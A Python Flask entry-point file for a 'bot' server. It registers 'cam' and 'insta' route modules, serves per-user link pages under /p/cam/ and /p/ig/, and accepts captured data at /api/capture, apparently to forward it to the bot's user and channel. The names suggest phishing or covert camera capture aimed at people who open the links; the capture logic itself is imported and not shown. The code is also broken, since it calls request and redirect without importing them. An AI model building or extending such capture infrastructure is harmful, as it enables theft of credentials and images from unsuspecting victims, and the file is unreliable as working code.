from flask import Flask
from bot.servers import register_cam_routes, register_insta_routes
from bot.servers.base import forward_to_user_and_channel  # Keep for compatibility

app = Flask(__name__)

# Register all server routes
register_cam_routes(app)
register_insta_routes(app)

# Default route
@app.route('/')
def home():
    return "✅ Bot is running!"

# Legacy route (for backward compatibility)
@app.route('/p/<uid>')
def legacy_page(uid):
    # Redirect to appropriate page based on type
    target_type = request.args.get('type', 'cam')
    if target_type == 'cam':
        return redirect(f"/p/cam/{uid}?v={request.args.get('v', 'unknown')}")
    elif target_type == 'ig':
        return redirect(f"/p/ig/{uid}?v={request.args.get('v', 'unknown')}")
    else:
        return "Page not found", 404

# Legacy capture (for backward compatibility)
@app.route('/api/capture', methods=['POST'])
def legacy_capture():
    from bot.servers.base import create_capture_route
    return create_capture_route('unknown')()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
